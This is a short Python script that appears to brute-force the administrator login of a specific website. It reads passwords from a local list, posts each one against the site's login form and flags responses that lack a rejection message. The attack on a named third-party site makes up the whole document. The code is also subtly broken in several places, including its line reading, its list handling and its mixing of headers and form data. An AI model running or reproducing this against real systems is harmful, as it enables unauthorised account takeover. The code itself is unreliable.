import re
import requests
URL="http://www.caizilt.com/user/login.html"
header={
"Accept":"application/json, text/javascript, */*; q=0.01",
"X-Requested-With":"XMLHttpRequest",
"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8",
"Origin":"http://www.caizilt.com",
"Referer":"http://www.caizilt.com/user/login.html",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"zh-CN,zh;q=0.9",
"Cookie":"re_url=http%3A%2F%2Fwww.caizilt.com%2F; hyphp_lang=zh-CN",
"Connection":"close",
        "user":"admin",
        "pass":"1234"
        }
with open("/mnt/home/CocRes/Password/pass.txt","r") as f:
    for i in f.readline():
        header['pass']=i.split()
        rest = requests.post(URL,data=header)
        print(rest.text)
        res='title:.*? "密码不符合规则"'
        strs=re.findall(res,rest.text)
        print(len(strs))
        if(len(strs) != 1):
            print("密码"+i.split())
